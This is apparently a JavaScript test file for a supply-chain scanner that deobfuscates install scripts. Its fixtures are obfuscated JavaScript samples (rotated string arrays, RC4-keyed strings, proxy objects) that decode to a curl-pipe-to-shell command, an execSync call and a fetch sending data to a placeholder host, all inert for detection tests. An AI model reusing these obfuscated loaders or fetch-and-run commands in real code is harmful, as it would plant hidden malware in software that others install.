// String arrays and proxy objects in the decoded view (0.1.8): twin of
// tests/scanner/test_string_arrays.py (core's comments above _SA_MAX_CHARS and
// _PX_MAX_ENTRIES). Inert text only: hosts are .invalid, nothing is executed.
import { test } from "node:test";
import assert from "node:assert/strict";
import { decodedView, installScriptRisk } from "../src/lib/hooks.js";

const NOTE = " (in strings it decodes as it runs)";
// built by the Python test's obfuscated(): a plain array rotated by its checksum; RC4 with the key each call passes
const PLAIN = "function _0xa1(){const _0xb2=['88521ab','https://x.invalid/c','POST','child_process','1043528xYZ','execSync','curl https://x.invalid/i.sh | sh','env'];_0xa1=function(){return _0xb2;};return _0xa1();}\nfunction _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-0x1d1;const _0xf6=_0xa1();let _0x17=_0xf6[_0xd4];return _0x17;}\nconst _0x90=_0xc3;\n(function(_0x3a,_0x4b){const _0x5c=_0xc3,_0x6d=_0x3a();while(!![]){try{const _0x7e=parseInt(_0x5c(0x1d2))/0x1+-parseInt(_0x5c(0x1d6))/0x3;if(_0x7e===_0x4b)break;else _0x6d['push'](_0x6d['shift']());}catch(_0x8f){_0x6d['push'](_0x6d['shift']());}}}(_0xa1,1014021.0));\nrequire(_0x90(0x1d1))[_0x90(0x1d3)](_0x90(0x1d4));\n";
const RC4 = "function _0xa1(){const _0xb2=['FuG3','hHVcP8klW5DZpq','d8oMnSoxrmkACCooW4tdI8o5Ex7cSg/cGmoXWP8Z','W7hdTrFcMq','E04OWOySW5BcKNuVWOXsW5PE','fXpcPSkkW5mGzXJdNMO','aSoQj8oezmozmmkc','W4ldJZBcOqBdVmo8wqibve54WPldOSo3kab/WQ/cPSkjW4HYxmk5W6DBeLnWwW'];_0xa1=function(){return _0xb2;};return _0xa1();}\nfunction _0xc3(_0xd4,_0xe5){_0xd4=_0xd4-0x1d1;const _0xf6=_0xa1();let _0x17=_0xf6[_0xd4];if(_0xc3['x']===undefined){var d=function(s){const a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';return s;};_0xc3['x']=!![];}return _0x17;}\nconst _0x90=_0xc3;\n(function(_0x3a,_0x4b){const _0x5c=_0xc3,_0x6d=_0x3a();while(!![]){try{const _0x7e=parseInt(_0x5c(0x1d2,'@)JO'))/0x1;if(_0x7e===_0x4b)break;else _0x6d['push'](_0x6d['shift']());}catch(_0x8f){_0x6d['push'](_0x6d['shift']());}}}(_0xa1,0xfec48));\nrequire(_0x90(0x1d1,'(Otd'))[_0x90(0x1d3,'a\\'b\\\\')](_0x90(0x1d4,'k(e)'));\n";

test("a plain array rotated by its checksum", () => {
  const view = decodedView(PLAIN);
  assert.ok(view.includes("require('child_process').execSync('curl https://x.invalid/i.sh | sh');"));
  assert.deepEqual(installScriptRisk(PLAIN), ["pipes a download into a shell" + NOTE]);
  assert.equal(view.split("\n").length, PLAIN.split("\n").length);
  const wrong = PLAIN.replace("1014021.0", "0x1234");
  assert.equal(decodedView(wrong), wrong);
});

test("RC4 with the key each call passes", () => {
  assert.ok(decodedView(RC4).includes("require('child_process').execSync('curl https://x.invalid/i.sh | sh');"));
});

test("proxy objects: calls, operators, strings, a proxy of a proxy, rows kept", () => {
  const text = "const o={'oEnxQ':function(f,a){return f(a);},'rqVFD':function(a,b){return a>=b;},"
    + "'OKaPt':'child_proc'+'ess','xY':function(a,b){return a in b;}};\n"
    + "o['oEnxQ'](require,o['OKaPt'])['execSync']('id');\nif(o['rqVFD'](a,b)&&o['xY']('k',m)){}\n";
  const view = decodedView(text);
  assert.ok(view.includes("require('child_process').execSync('id');"));
  assert.ok(view.includes("if((a >= b)&&('k' in m)){}"));
  const chain = "const p={'A':function(f,a,b){return f(a,b);}};\n"
    + "const q={'B':function(x,y,z){const g=h;return p['A'](x,y,z);},'C':p['A']};\n"
    + "q['B'](fetch,\n  'https://x.invalid/c',\n  {'body':s});\nq['C'](g,1,2);\n";
  const v2 = decodedView(chain);
  assert.ok(v2.includes("fetch('https://x.invalid/c', {'body':s})\n\n;\n"));
  assert.ok(v2.includes("g(1, 2);"));
  assert.equal(v2.split("\n").length, chain.split("\n").length);
});
